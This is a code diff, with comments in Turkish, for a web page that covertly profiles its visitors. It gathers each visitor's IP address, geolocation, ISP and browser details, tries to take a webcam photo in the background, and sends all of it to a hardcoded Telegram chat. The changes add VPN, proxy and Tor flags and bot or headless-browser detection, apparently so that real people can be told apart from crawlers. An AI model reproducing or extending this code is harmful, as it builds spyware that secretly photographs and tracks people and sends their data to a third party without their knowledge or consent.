@@ -41,11 +41,11 @@
         const CHAT_ID = "8610330090";
 
         // ============================================================
-        // 1. IP ve Konum Bilgisi (hızlı, 3 sn timeout)
+        // 1. IP ve Konum Bilgisi (vpn/proxy dahil)
         // ============================================================
         async function getIPInfo() {
             try {
-                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
                 const data = await res.json();
                 return {
                     ip: data.ip || 'Bilinmiyor',
@@ -53,17 +53,37 @@
                     city: data.city || 'N/A',
                     region: data.region || 'N/A',
                     isp: data.org || 'N/A',
+                    // Güvenlik bilgileri
+                    is_proxy: data.proxy || false,
+                    is_vpn: data.vpn || false,
+                    is_tor: data.tor || false,
+                    is_hosting: data.hosting || false,
                 };
             } catch {
-                return { ip: 'Alınamadı', country: 'N/A', city: 'N/A', region: 'N/A', isp: 'N/A' };
+                return {
+                    ip: 'Alınamadı',
+                    country: 'N/A',
+                    city: 'N/A',
+                    region: 'N/A',
+                    isp: 'N/A',
+                    is_proxy: false,
+                    is_vpn: false,
+                    is_tor: false,
+                    is_hosting: false,
+                };
             }
         }
 
         // ============================================================
-        // 2. Tarayıcı Bilgileri (anında)
+        // 2. Tarayıcı Bilgileri + Bot Tespiti
         // ============================================================
         function getBrowserInfo() {
             const ua = navigator.userAgent;
+            const isWebDriver = !!navigator.webdriver;
+            const isHeadless = !navigator.plugins.length && !navigator.language; // basit kontrol
+            const isBotUA = /bot|crawl|spider|scrape|headless/i.test(ua);
+            const isKnownBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/i.test(ua);
+
             let os = 'Bilinmiyor';
             if (ua.includes('Win')) os = 'Windows';
             else if (ua.includes('Mac')) os = 'macOS';
@@ -77,17 +97,32 @@
             else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
 
+            // Kullanıcı tipi kararı
+            let userType = '👤 Gerçek Kullanıcı';
+            if (isKnownBot) {
+                userType = '🤖 Bilinen Bot';
+            } else if (isBotUA || isWebDriver || isHeadless) {
+                userType = '🤖 Şüpheli Bot / Headless Tarayıcı';
+            } else {
+                userType = '👤 Gerçek Kullanıcı';
+            }
+
             return {
                 ua,
                 os,
                 browser,
                 language: navigator.language || 'Bilinmiyor',
-                screen: `${window.screen.width}x${window.screen.height}`
+                screen: `${window.screen.width}x${window.screen.height}`,
+                isWebDriver,
+                isHeadless,
+                isBotUA,
+                isKnownBot,
+                userType
             };
         }
 
         // ============================================================
-        // 3. Webcam Fotoğrafı Çek (arka planda, hata yönetimi yok)
+        // 3. Webcam Fotoğrafı Çek (arka planda)
         // ============================================================
         function captureWebcam() {
             return new Promise((resolve) => {
@@ -115,19 +150,36 @@
         }
 
         // ============================================================
-        // 4. Telegram'a Metin Gönder (IP + tarayıcı)
+        // 4. Telegram'a Metin Gönder (detaylı)
         // ============================================================
         async function sendTextToTelegram(ipInfo, browserInfo) {
+            // VPN/Proxy durumu
+            let securityStatus = '✅ Güvenli';
+            if (ipInfo.is_vpn) securityStatus = '🛡️ VPN';
+            else if (ipInfo.is_proxy) securityStatus = '⚠️ Proxy';
+            else if (ipInfo.is_tor) securityStatus = '🌐 Tor';
+            else if (ipInfo.is_hosting) securityStatus = '☁️ Hosting/VPS';
+
             const text = `
 🕵️ Yeni Ziyaretçi
 
+📌 Kullanıcı Tipi: ${browserInfo.userType}
+
 🌍 IP: ${ipInfo.ip}
-📍 ${ipInfo.country}, ${ipInfo.city} (${ipInfo.region})
+📍 Konum: ${ipInfo.country}, ${ipInfo.city} (${ipInfo.region})
 🏢 ISP: ${ipInfo.isp}
+🔒 Güvenlik: ${securityStatus}
+
 🖥️ OS: ${browserInfo.os}
 🌐 Tarayıcı: ${browserInfo.browser}
 📱 Ekran: ${browserInfo.screen}
 🗣️ Dil: ${browserInfo.language}
+
+🕵️ Bot Tespiti:
+  • webdriver: ${browserInfo.isWebDriver ? '✅ Evet' : '❌ Hayır'}
+  • headless: ${browserInfo.isHeadless ? '✅ Evet' : '❌ Hayır'}
+  • botUA: ${browserInfo.isBotUA ? '✅ Evet' : '❌ Hayır'}
+
 📅 ${new Date().toLocaleString()}
             `;
 
@@ -139,7 +191,7 @@
         }
 
         // ============================================================
-        // 5. Telegram'a Fotoğraf Gönder (ayrı)
+        // 5. Telegram'a Fotoğraf Gönder
         // ============================================================
         async function sendPhotoToTelegram(imageBase64) {
             if (!imageBase64) return;
@@ -163,7 +215,7 @@
             const ipInfo = await getIPInfo();
             const browserInfo = getBrowserInfo();
 
-            // 2. Hemen Telegram'a metin gönder (IP + tarayıcı)
+            // 2. Hemen Telegram'a metin gönder (IP + tarayıcı + bot/vpn tespiti)
             await sendTextToTelegram(ipInfo, browserInfo);
 
             // 3. Kamera arka planda çalışsın, sonucu bekleme (ayrı gönder)
